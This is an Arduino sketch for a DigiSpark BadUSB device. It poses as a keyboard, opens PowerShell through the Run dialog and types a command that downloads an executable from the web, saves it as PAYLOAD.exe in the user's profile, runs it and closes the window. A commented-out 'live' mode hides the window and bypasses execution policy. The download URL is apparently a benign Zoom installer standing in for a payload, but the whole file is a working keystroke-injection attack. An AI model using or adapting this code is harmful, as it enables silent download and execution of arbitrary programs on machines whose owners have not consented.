#include "DigiKeyboard.h"
 
void setup() {
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro
}

//uncomment to run live
  //char mode[] = "powershell -nop -win h -noni -exec bypass";
  char mode[] = "powershell";
  char separator[] = "exit";
//end live
 
void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("wget https://zoom.us/client/5.11.0.6569/ZoomInstallerFull.exe?archType=x64 -OutFile $env:userprofile\\PAYLOAD.exe; start-process $env:userprofile\\PAYLOAD.exe; stop-process -Id $PID");
  
  DigiKeyboard.delay(500);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(2500);
   
  blinkLed();
}

void blinkLed()
{
  while (true) {
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
    delay(250);               // wait for 1/4 of a second
    digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
    digitalWrite(1, LOW);
    delay(250);
  }
}
